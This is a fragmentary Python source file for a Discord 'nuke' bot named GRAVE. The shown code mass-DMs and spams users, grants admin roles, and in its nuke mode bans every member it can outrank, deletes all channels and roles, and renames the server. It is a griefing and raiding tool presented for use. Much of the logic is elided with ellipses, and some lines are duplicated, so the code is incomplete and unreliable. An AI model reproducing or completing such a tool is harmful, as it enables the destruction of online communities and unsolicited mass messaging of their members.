...
help_menu = f"""
__Available commands for the GRAVE Mass DM bot__ :

**{prefix}help** - ShowS this message.

:red_circle: Activations
...
async def help(ctx):
    ...
    if validation:
        print(colored("GRAVE - HELP MENU RECEIVED",'magenta'))
        if ctx.guild:
    ...
    if validation:
        ...
        if mode == "all":
            if nickname != "":
                ...
                print(colored(f"{time}",'white'), colored("GRAVE - NICKNAME CHANGE COMPLETE",'magenta'))
...
async def grantadmin(ctx, mode=""):
    ...
    if validation:
        ...
        if mode == "all":
            ...
            print(colored(f"{time}", 'white'), colored("GRAVE - ADMIN GRANT COMPLETE", 'magenta'))
        else:
            time = datetime.now().strftime("%H:%M:%S")
            member_id = int(mode.strip("<@!>"))
            member = discord.utils.get(guild.members, id=member_id)
    ...
    if validation:
        ...
        if ctx.guild is not None:
            try:
                ...
                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("GRAVE - MASS DM COMPLETE",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
            ...
            try:
                ...
                print(colored(f"{time}",'white'), colored("GRAVE - MASS DM COMPLETE",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
        ...
        if message != '':
            if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                try:
                    ...
                    print(colored(f"{time}",'white'), colored("GRAVE - USER DM COMPLETE",'magenta'))
                except:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                    if amount < 50:
                        try:
                            ...
                            print(colored(f"{time}",'white'), colored("GRAVE - USER SPAM COMPLETE",'magenta'))
                        except:
                            time = datetime.now().strftime("%H:%M:%S")
        ...
        if mode in nuke_modes:
            if mode == "members":
                    ...
                    for member in guild.members:
                        if str(member.id) not in userid and member.id != client.user.id:
                            if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                try:
                                    await member.ban(reason="GRAVE - NUKE")
                                    time = datetime.now().strftime("%H:%M:%S")
                                ...
                                time = datetime.now().strftime("%H:%M:%S")
                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                    print(colored(f"{time}",'white'), colored("GRAVE - MEMBER BAN COMPLETE",'magenta'))
                else:
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("GRAVE - CHANNEL DELETION COMPLETE",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("GRAVE - ROLE DELETION COMPLETE",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    await guild.edit(name="GRAVE-ENTERED-THE-CHAT")
                    time = datetime.now().strftime("%H:%M:%S")
                    print(colored(f"{time}",'white'), colored(f"Changed server name to GRAVE - ENTERED - THE CHAT",'green'))
                    print(colored(f"{time}",'white'), colored("GRAVE - NUKE COMPLETED",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
